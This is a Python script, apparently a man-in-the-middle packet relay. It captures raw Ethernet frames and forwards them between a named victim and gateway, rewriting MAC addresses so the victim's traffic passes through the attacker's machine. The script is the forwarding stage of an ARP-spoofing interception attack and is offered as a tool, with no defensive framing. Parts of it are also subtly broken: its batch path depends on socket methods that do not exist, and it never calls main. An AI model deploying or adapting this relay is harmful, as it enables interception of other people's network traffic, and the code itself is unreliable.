#!/usr/bin/env python3
# fast_l2_redirect_sendmsg_batch.py
# Implements memoryview sendmsg and recvmmsg/sendmmsg batching

import os
import sys
import socket
import struct
import argparse
from fcntl import ioctl

ETH_P_ALL = 0x0003
SIOCGIFHWADDR = 0x8927
SIOCGIFINDEX  = 0x8933
SIOCGIFMTU    = 0x8921
MAX_FRAME = 65536
BATCH_SIZE = 8  # number of frames per batch for recvmmsg/sendmmsg

settings = {}
if os.path.exists("puller.settings"):
    with open("puller.settings", "r") as f:
        for line in f:
            parts = line.split()
            if len(parts) >= 2:
                settings[parts[0].strip()] = parts[1].strip()

def if_hwaddr(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        req = struct.pack('256s', ifname[:15].encode())
        info = ioctl(s.fileno(), SIOCGIFHWADDR, req)
        return info[18:24]
    finally:
        if ioctl_sock is None:
            s.close()

def if_index(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFINDEX, ifreq)
        return struct.unpack('i', res[16:20])[0]
    finally:
        if ioctl_sock is None:
            s.close()

def if_mtu(ifname, ioctl_sock=None):
    s = ioctl_sock or socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        ifreq = struct.pack('256s', ifname[:15].encode())
        res = ioctl(s.fileno(), SIOCGIFMTU, ifreq)
        return struct.unpack('i', res[16:20])[0]
    except Exception:
        return None
    finally:
        if ioctl_sock is None:
            s.close()

def resolve_mac_ip(iface, ip):
    import subprocess
    try:
        out = subprocess.check_output(["ip", "neigh", "show", "to", ip], stderr=subprocess.DEVNULL)
        text = out.decode(errors="ignore")
    except Exception:
        return None
    for token in text.split():
        if token.count(':') == 5:
            try:
                return bytes(int(b, 16) for b in token.split(':'))
            except Exception:
                continue
    return None

def mac_str_to_bytes(mac):
    return bytes(int(x,16) for x in mac.split(':'))

def main(IFACE, VICTIM, GATEWAY):
    if os.geteuid() != 0:
        print("run as root")
        sys.exit(1)

    victim_mac = resolve_mac_ip(IFACE, VICTIM)
    gateway_mac = resolve_mac_ip(IFACE, GATEWAY)
    if not victim_mac or not gateway_mac:
        print("couldn't resolve macs")
        sys.exit(1)

    ioctl_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        attacker_mac = if_hwaddr(IFACE, ioctl_sock)
        ifindex = if_index(IFACE, ioctl_sock)
        mtu = if_mtu(IFACE, ioctl_sock)
    finally:
        ioctl_sock.close()

    allowed_frame_max = (mtu+14) if mtu else 1514

    s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(ETH_P_ALL))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 4*1024*1024)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 4*1024*1024)
    s.bind((IFACE,0))

    recv_bufs = [bytearray(MAX_FRAME) for _ in range(BATCH_SIZE)]
    recv_mvs = [memoryview(b) for b in recv_bufs]
    send_buf = bytearray(MAX_FRAME)
    send_mv = memoryview(send_buf)

    v_mac = victim_mac
    g_mac = gateway_mac
    a_mac = attacker_mac

    def mac_to_str(b):
        return ':'.join(f"{x:02x}" for x in b)

    print("attacker mac:", mac_to_str(a_mac))
    print("victim mac:", mac_to_str(v_mac))
    print("gateway mac:", mac_to_str(g_mac))
    print("iface mtu:", mtu, "allowed_frame_max:", allowed_frame_max)
    print("starting loop...")

    oversized_logged = False
    use_recvmmsg = hasattr(s, "recvmmsg") and hasattr(s, "sendmmsg")

    try:
        while True:
            if use_recvmmsg:
                # batch receive
                batch = []
                n_received = s.recvmmsg(recv_mvs, 0)
                for i in range(n_received):
                    frame = recv_mvs[i][:len(recv_mvs[i])]
                    src = bytes(frame[6:12])
                    if src == a_mac:
                        continue
                    send_len = min(len(frame), allowed_frame_max)
                    if send_len < len(frame) and not oversized_logged:
                        print(f"warning: received frame {len(frame)} bytes > allowed {allowed_frame_max}; truncating.")
                        oversized_logged = True
                    batch.append((frame, src, send_len))

                # batch send
                send_iovs = []
                for frame, src, send_len in batch:
                    if src == v_mac:
                        send_mv[0:6] = g_mac
                        send_mv[6:12] = a_mac
                        send_mv[12:send_len] = frame[12:send_len]
                        send_iovs.append(send_mv[:send_len])
                    elif src == g_mac:
                        send_mv[0:6] = v_mac
                        send_mv[6:12] = a_mac
                        send_mv[12:send_len] = frame[12:send_len]
                        send_iovs.append(send_mv[:send_len])
                if send_iovs:
                    try:
                        s.sendmmsg(send_iovs)
                    except Exception:
                        for buf in send_iovs:
                            try:
                                s.send(bytes(buf))
                            except Exception:
                                s.sendto(bytes(buf), (IFACE,0))
            else:
                # fallback single-packet loop
                nbytes, _, _, _ = s.recvmsg_into([recv_mvs[0]],0)
                if nbytes <= 14:
                    continue
                frame = recv_mvs[0][:nbytes]
                src = bytes(frame[6:12])
                if src == a_mac:
                    continue
                send_len = min(nbytes, allowed_frame_max)
                if send_len < nbytes and not oversized_logged:
                    print(f"warning: received frame {nbytes} bytes > allowed {allowed_frame_max}; truncating.")
                    oversized_logged = True

                if src == v_mac:
                    send_mv[0:6] = g_mac
                    send_mv[6:12] = a_mac
                    send_mv[12:send_len] = frame[12:send_len]
                elif src == g_mac:
                    send_mv[0:6] = v_mac
                    send_mv[6:12] = a_mac
                    send_mv[12:send_len] = frame[12:send_len]
                else:
                    continue

                # robust send: memoryview -> bytes -> sendto
                try:
                    s.sendmsg([send_mv[:send_len]])
                except Exception:
                    try:
                        s.send(bytes(send_mv[:send_len]))
                    except Exception:
                        s.sendto(bytes(send_mv[:send_len]), (IFACE,0))
    except KeyboardInterrupt:
        pass
    finally:
        s.close()
